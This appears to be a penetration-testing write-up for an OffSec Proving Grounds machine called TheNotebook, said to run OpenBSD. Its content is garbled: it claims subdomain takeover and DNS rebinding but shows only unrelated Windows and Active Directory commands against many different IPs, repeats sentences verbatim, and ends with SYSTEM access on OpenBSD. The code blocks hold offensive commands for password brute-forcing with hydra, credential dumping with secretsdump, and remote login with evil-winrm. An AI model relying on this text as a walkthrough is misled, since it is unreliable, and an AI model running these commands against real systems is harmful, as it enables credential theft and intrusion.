---
TitleSEO: "OffSec Proving Grounds — TheNotebook (Medium OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — TheNotebook (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds TheNotebook. Subdomain Takeover and DNS Rebinding to achieve medium compromise on OpenBSD."
Keywords: "insane, easy, windows, medium, linux, forensics"
URL: "https://zurefx.github.io/writeups/htb-thenotebook-138.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-thenotebook-138/"
Date: "2025-10-16"
Tags: "Insane, Easy, Windows, Medium, Linux, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-thenotebook-138"
Permalink: "/writeups/htb-thenotebook-138.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **TheNotebook** is rated **Medium** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.84.138.204`.

### Objectives

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.70.155.29
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.232.186/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.206.157 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.27.68.125/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.70.194.230 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5432,21,1521 10.128.244.69 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.71.17.187 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Subdomain Takeover**.

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

```bash
crackmapexec smb 10.25.234.147 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p3389,110,8443 10.42.192.230 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.11.69 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.59.69.185 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.248.89
evil-winrm -i 10.121.168.46 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.250.163 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `psexec`
- `pwncat`
- `wpscan`
- `socat`
- `secretsdump`

### Key Takeaways

- Subdomain Takeover
- DNS Rebinding
